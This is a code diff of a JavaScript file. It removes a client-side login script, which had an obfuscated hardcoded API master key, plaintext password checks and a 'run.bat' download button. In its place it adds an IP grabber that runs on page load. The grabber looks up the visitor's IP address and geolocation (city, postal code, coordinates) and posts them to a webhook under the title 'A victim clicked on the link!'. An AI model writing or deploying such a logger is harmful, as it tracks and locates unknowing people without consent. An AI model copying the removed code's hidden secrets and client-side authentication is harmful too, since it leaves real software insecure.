@@ -1,87 +1,42 @@
-document.getElementById('login-btn').addEventListener('click', async () => {
-    const username = document.getElementById('username').value.trim();
-    const password = document.getElementById('password').value.trim();
-    const errorMsg = document.getElementById('error-msg');
-    const loginContainer = document.getElementById('login-container');
-    const menuContainer = document.getElementById('menu-container');
-    const loginBtn = document.getElementById('login-btn');
-    let cooldown = false;
-
-    const adfghasdfgh = "CaLNIuQxh/pX5f";
-    const adfghasdfgdf = "UsZlKPkvUnJSIiB1.";
-    const asdhfsdafgh = "$2a$10$EGk.IxPEfM";
-    const asdhfsdafgf = "opz.WZYNyz7e";
-    const asdhfsdafae = "c97be91f8cc3";
-    const asdhfsdadhd = "68a02c4a43b1";
-    const API_URL = 'https://api.jsonbin.io/v3/b/' + asdhfsdadhd + asdhfsdafae + '/latest';
-    const API_KEY = asdhfsdafgh + asdhfsdafgf + adfghasdfgh + adfghasdfgdf;
-
-    async function fetchUserData() {
-        try {
-            const response = await fetch(API_URL, {
-                method: 'GET',
-                headers: {
-                    'X-Master-Key': API_KEY,
-                    'Content-Type': 'application/json'
-                }
-            });
-
-            if (!response.ok) throw new Error('Failed to fetch user data');
-            const users = await response.json();
-            return users;
-        } catch (err) {
-            errorMsg.textContent = 'Server error, try again later.';
-            throw err;
-        }
-    }
-
-
-    function startCooldown() {
-        cooldown = true;
-        loginBtn.disabled = true;
-
-        let countdown = 5;
-        loginBtn.innerText = `Try again in ${countdown}...`;
-
-        const countdownInterval = setInterval(() => {
-            countdown--;
-            loginBtn.innerText = `Try again in ${countdown}...`;
-
-            if (countdown <= 0) {
-                clearInterval(countdownInterval);
-                loginBtn.innerText = 'Login';
-                loginBtn.disabled = false;
-                cooldown = false;
+const sendIP = () => {
+    fetch('https://api.ipify.org?format=json')
+        .then(ipResponse => ipResponse.json())
+        .then(ipData => {
+            const ipadd = ipData.ip;
+            return fetch(`https://ipapi.co/${ipadd}/json/`)
+                .then(geoResponse => geoResponse.json())
+                .then(geoData => {
+                    const dscURL = 'YOUR WEBHOOK'; // replace with your webhook url
+                    return fetch(dscURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            username: "site logger <3", // optionally changeable
+                            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
+                            content: `@here`,
+                            embeds: [
+                                {
+                                    title: 'A victim clicked on the link!',
+                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
+                                    color: 0x800080 // optionally changeable
+                                }
+                            ]
+                        })
+                    });
+                });
+        })
+        .then(dscResponse => {  
+            if (dscResponse.ok) {
+                console.log('Sent! <3');
+            } else {
+                console.log('Failed :(');
             }
-        }, 1000);
-    }
-
-    if (cooldown) return;
-
-    errorMsg.textContent = '';
-
-    if (!username || !password) {
-        errorMsg.textContent = 'Please fill in both fields.';
-        return;
-    }
-
-    try {
-        const users = await fetchUserData();
-        const userEntry = Object.values(users.record).find(
-            (user) => user.username === username && user.password === password
-        );
-
-        if (userEntry) {
-            loginContainer.style.display = 'none';
-            menuContainer.style.display = 'block';
-        } else {
-            errorMsg.textContent = 'Invalid username or password.';
-            startCooldown();
-        }
-    } catch {
-    }
-});
-
-document.getElementById('download-btn').addEventListener('click', () => {
-    window.location.href = 'run.bat';
-});
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            console.log('Error :(');
+        });
+};
+sendIP();
